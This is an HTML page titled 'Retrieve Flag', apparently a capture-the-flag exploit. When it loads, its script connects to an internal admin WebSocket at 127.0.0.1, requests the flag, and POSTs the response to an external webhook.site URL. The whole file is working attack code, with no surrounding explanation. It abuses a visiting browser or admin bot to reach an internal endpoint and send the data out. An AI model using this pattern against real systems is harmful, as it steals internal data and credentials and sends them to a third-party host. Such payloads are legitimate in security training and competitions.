<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retrieve Flag</title>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const ws = new WebSocket('ws://127.0.0.1/admin/ws'); // Replace <server-address> with the actual server address

            ws.onopen = () => {
                console.log('WebSocket connection opened.');
                ws.send('flag'); // Request the flag
            };

            ws.onmessage = (event) => {
                console.log('Message from server:', event.data);
                if (event.data.includes('flag')) {
                    // Send the flag to the specified URL
                    fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flag', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ flag: event.data }),
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Flag sent to webhook:', data);
                    })
                    .catch(error => {
                        console.error('Error sending flag:', error);
                    });
                }
                ws.close();
            };

            ws.onclose = () => {
                console.log('WebSocket connection closed.');
            };

            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };
        });
    </script>
</head>
<body>
    <h1>Retrieve Flag</h1>
    <p>Connecting...</p>
</body>
</html>
